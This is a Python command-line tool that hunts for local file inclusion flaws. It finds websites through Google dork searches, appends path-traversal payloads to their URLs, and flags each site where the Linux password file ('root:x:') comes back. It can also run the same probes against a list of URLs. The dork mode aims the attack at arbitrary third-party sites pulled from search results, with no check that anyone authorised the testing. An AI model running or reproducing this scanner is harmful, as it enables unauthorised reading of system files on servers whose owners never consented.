import requests
from bs4 import BeautifulSoup
from urllib.parse import unquote
from colorama import Fore, Style
import time
import entery
import urllib
import random


class LFIScanner:
    def __init__(self):
        try:
            with open("payload.txt", "r", encoding="utf-8") as f:
                self.lfi_payloads = [payload.strip() for payload in f.readlines()]
        except FileNotFoundError:
            print(Fore.RED + Style.BRIGHT + "[!] payload.txt not found.")
            self.lfi_payloads = []

    def google_lfi(self, num_results: int):
        search_engine = "https://www.google.com/search"

        try:
            with open("lfi.txt", "r", encoding="utf-8") as f:
                dorks = f.readlines()
        except FileNotFoundError:
            print(Fore.RED + Style.BRIGHT + "[!] lfi.txt not found.")
            return
        random.shuffle(dorks)
        for dork in dorks:
            dork = dork.strip()
            url = f"{search_engine}?q={dork}&num={num_results}"
            try:
                response = requests.get(url, timeout=5)
            except requests.exceptions.RequestException as e:
                print(Fore.RED + Style.BRIGHT + "[!] Request exception: %s" % e)
                continue

            soup = BeautifulSoup(response.text, "html.parser")
            results = soup.find_all("a")
            urls = [unquote(result.get("href")[7:].split("&")[0]) for result in results if result.get("href").startswith("/url?q=")]

            for url in urls:
                for payload in self.lfi_payloads:
                    target_url = f"{url}{payload}"
                    try:
                        response = requests.get(target_url, timeout=5)
                        if "root:x:" in response.text:
                            print(
                                Fore.RED + Style.BRIGHT + f"[+] LFI vulnerability found at {target_url}" + Style.RESET_ALL)
                            with open("google_lfi_results.txt", "a") as f:
                                f.write(f"{target_url}\n")
                                print(Fore.MAGENTA + Style.BRIGHT + "Vulnerability URLs saved in google_lfi_results.txt file...")
                        else:
                            print(
                                Fore.BLUE + Style.BRIGHT + f"[-] {target_url} is not vulnerable to LFI" + Fore.YELLOW)
                    except requests.exceptions.RequestException as e:
                        print(Fore.RED + Style.BRIGHT + "[!] Request exception: %s" % e)

    def check_lfi(self, url):
        for payload in self.lfi_payloads:
            try:
                response = requests.get(url + payload, timeout=5)
                if "root:x:" in response.text:
                    print(Fore.RED + Style.BRIGHT + f"[+] LFI vulnerability found at {url}{payload}" + Style.RESET_ALL)
                else:
                    print(Fore.BLUE + Style.BRIGHT + f"[-] LFI not found at {url}{payload}" + Fore.GREEN)
            except requests.exceptions.RequestException as e:
                print(Fore.RED + Style.BRIGHT + "[!] Request exception: %s" % e)

    def run(self):
        while True:
            try:
                choice = int(input(
                    Fore.YELLOW + Style.BRIGHT + "Choose an option:\n"
                    "1. Scan LFI with Google dorks\n"
                    "2. Scan LFI in target URLs\n"
                    "0. Quit\n"
                    "Enter your choice: "
                ))
            except ValueError:
                print(Fore.RED + Style.BRIGHT + "Invalid choice. Please choose again.")
                continue

            if choice == 1:
                try:
                    num_results = int(input(
                        Fore.BLUE + Style.BRIGHT + "<Example Result Number: 10>\n"
                        "Enter the number of search results to process: "
                    ))
                    self.google_lfi(num_results)
                    print(Fore.GREEN + Style.BRIGHT + "Search finished.")
                except ValueError:
                    print(Fore.RED + Style.BRIGHT + "Invalid input. Please enter a valid number.")
                    continue
            elif choice == 2:
                try:
                    url_list_path = input(
                        Fore.CYAN + Style.BRIGHT + "Enter the URL list file path (e.g., url.txt): "
                    )
                    with open(url_list_path, 'r', encoding="utf-8") as f:
                        urls = f.readlines()
                    for url in urls:
                        url = url.strip()
                        self.check_lfi(url)
                    print(Fore.GREEN + Style.BRIGHT + "Search finished.")
                except FileNotFoundError:
                    print(Fore.RED + Style.BRIGHT + "URL list file not found.")
                    continue
            elif choice == 0:
                print(Fore.CYAN + Style.BRIGHT + "Quitting...")
                break
            else:
                print(Fore.RED + Style.BRIGHT + "Invalid choice. Please choose a valid option.")
                


if __name__ == "__main__":
    entery.entryy()
    scanner = LFIScanner()
    scanner.run()